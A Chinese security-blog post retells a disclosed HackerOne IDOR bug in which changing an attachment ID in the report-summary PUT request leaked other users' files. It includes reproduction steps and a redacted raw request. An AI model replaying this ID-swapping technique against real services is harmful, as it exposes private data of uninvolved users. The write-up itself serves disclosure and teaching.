#  Hackerone 附件功能存在IDOR越权漏洞15000$   
原创 Fighter001  重生者安全   2024-05-02 00:00  
  
由于微信公众号推送机制的改变避免错过文章麻烦您将公众号  
设为星标  
感谢您的支持！![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/Social.png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEVwkT7gYkkHQA0nVKBpKOsiaG0J32krN4DJxTDwtr6DssNkjCAvNlBb4YkhpyfibFzOjfZEyo7NtBs1S8Bqly3w/640?wx_fmt=png&from=appmsg "")  
  
想要学习：【  
漏洞挖掘，内网渗透OSCP，车联网，二进制】的朋友欢迎加入知识星球一起学习。如果不满意，72小时内可在APP内无条件自助退款。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEVwkT7gYklprG8WAchaRgz0jbibibGtEDEoccibqeMBo4wM4DgGPdqfhUx5BiaM45LcH7ClKs7Yqp0ribONKmnNTTA/640?wx_fmt=png&from=appmsg "")  
  
![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/Expression/Expression_93@2x.png "")  
  
-->进入正题啦  
  
Hackerone 披露报告：  
Hackerone 提供了一种用于向各种程序报告漏洞的表格。其中表单支持上传文件和预览（图像或视频），但不允许使用属于其他帐户的文件 ID。但通过摘要报告功能，作为一名黑客，我只需更改 ID 即可泄露属于其他用户的文件。这是非常严重的。  
  
我尝试通过提交报告、编辑报告表单调用属于其他帐户的文件，但它不起作用，它总是得到响应 "was_successful":false,  
 。但幸运的是，我可以找到另一个端点，该端点能够读取属于其他帐户的文件，即在摘要报告功能中。![](https://mmbiz.qpic.cn/sz_mmbiz_png/SEVwkT7gYknKibytNhquIWB001XlxNzGbAxbvyNsvG5ql2OjKQwbaUgHanEnsiaJhS76uPibu2rIJIqkMRlPPhGLQ/640?wx_fmt=png&from=appmsg "")  
  
  
复现步骤：  
1. 攻击者创建草稿或现有报告，然后创建黑客摘要  
  
1. 然后编辑摘要并将文件提供给。  
  
1. 拦截与拦截将攻击者文件ID更改为受害者文件ID  
  
1. 在Markdown预览中读取boom文件。  
  
原始请求：  
```
附件通过添加摘要报告泄露：
受害者文件ID：
3155239
我会将 F3155244 更改为 3155239
攻击者文件：
3155241
3155242
“was_successful”：true，（如果文件来自攻击者）我将更改为受害者文件
“was_successful”：假，将假
尝试通过内容泄漏：误报
通过摘要泄漏：成功
```  
  
受影响端点  
```
PUT /reports/████/summaries/███████ HTTP/2
Host: hackerone.com
.....all header ...
Content-Length: 908
Origin: https://hackerone.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"id":████████,"category":"researcher","content":"TESTEDIT\n\n{F3155244} ","updated_at":"2024-03-30T17:16:29.625Z","user":{"id":█████,"username":"█████","name":"██████████████","bio":"please see pdfx","cleared":false,"verified":false,"website":null,"location":"","created_at":"2024-03-29T11:27:50.077Z","url":"https://hackerone.com/██████████","hackerone_triager":false,"hackerone_employee":false,"user_type":"hacker","profile_picture_urls":{"small":"/assets/avatars/default-█████.png","medium":"/assets/avatars/default-███████.png","xtralarge":"/assets/avatars/default-███████.png"}},"can_view?":true,"can_create?":true,"attachments":[],"action_type":"publish","attachment_ids":[
3155239]}
```  
  
漏洞影响：  
这是非常糟糕的，尤其是 id 形式只是按顺序排列的数字。我可以添加 hackerone 帐户的所有文件 ID，如果是视频的话我可以看到其他人的poc。  
**喜欢朋友可以点点赞转发转发。**  
****  
  
**免责声明：本公众号不承担任何由于传播、利用本公众号所发布内容而造成的任何后果及法律责任。未经许可，不得转载。**  
  
